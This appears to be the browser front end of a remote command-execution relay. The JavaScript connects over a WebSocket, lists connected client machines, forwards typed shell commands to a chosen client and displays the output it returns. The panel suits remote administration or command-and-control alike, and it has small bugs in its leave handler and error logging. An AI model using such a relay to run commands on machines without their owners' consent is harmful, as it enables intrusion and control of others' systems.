const _version = 'v0.9';
const _identifierName = 'web';
//

const _actions = { listjoins: 'listjoins', join: 'join', forward: 'forward', respond: 'respond', leave: 'leave', id: 'id' };

let $clientList, $commandInput, $commandRows;
let _socket, _isConnected = false;


const sendCommand = (e, text) => {
    if ((e.ctrlKey || e.metaKey) && (e.keyCode == 13 || e.keyCode == 10) && text.trim().length > 0 && $clientList.value.length > 0) {
        _publishMessage(_actions.forward, $clientList.value, text.trim());
        addCommandResultRow({ input: `_$ ${text.trim()}` });
    }
}

const addCommandResultRow = (result) => {
    $commandRows.innerHTML += '\n\n';

    if ((result.input || '').length > 0) {
        $commandRows.innerText += result.input + '\n';
    }
    if ((result.output || '').length > 0) {
        $commandRows.innerText += result.output + '\n';
    }
    if ((result.error || '').length > 0) {
        $commandRows.innerText += result.error + '\n';
    }
}

const addClientList = (client) => {
    let option = document.createElement('option');
    option.value = client.id;
    option.innerHTML = `${client.id} :: ${client.name}`;
    option.disabled = client.name === _identifierName;
    $clientList.appendChild(option);
}

const removeClientList = (id) => {
    for (let i = 0; i < $clientList.length; i++) {
        if ($clientList.options[i].value == id)
            $clientList.remove(i);
    }
}

const _publishMessage = (action, target, data) => {
    if (!_isConnected) {
        return;
    }
    _socket.send(`${action}<<<${target}<<<${data}`);
}

const _handleSocketMessage = (data) => {
    const args = data.split('<<<');
    const action = args[0];
    const target = args[1];
    const payload = args[2];

    switch (action) {
        case _actions.join:
            addClientList(JSON.parse(payload));
            break;

        case _actions.listjoins:
            const joins = JSON.parse(payload);
            joins.forEach(addClientList)
            break;

        case _actions.leave:
            removeClientList(id);
            break;

        case _actions.respond:
            addCommandResultRow(JSON.parse(payload));
            break;

        default:
            console.log(`invalid message: ${data}`);
            break;
    }
}

const init = () => {
    $clientList = document.querySelector('#client-list');
    $commandInput = document.querySelector('#command-input');
    $commandRows = document.querySelector('#command-rows');

    try {
        _socket = new WebSocket(`ws://${location.hostname}:${location.port}/`, ['r2ce']);

        _socket.onopen = function (a) {
            console.log('ws connect');
            _isConnected = true;
            _publishMessage(_actions.join, 'server', _identifierName);
        };

        _socket.onerror = function (err) {
            _isConnected = false;
            console.log('ws error ', err);
        };

        _socket.onmessage = function (e) {
            console.log('ws message: ', e.data);
            _handleSocketMessage(e.data);
        };

        _socket.onclose = function () {
            _isConnected = false;
            console.log('ws close');
        };
    } catch (err) {
        console.err(err);
    }

    console.log('init done');
};

window.onload = () => init();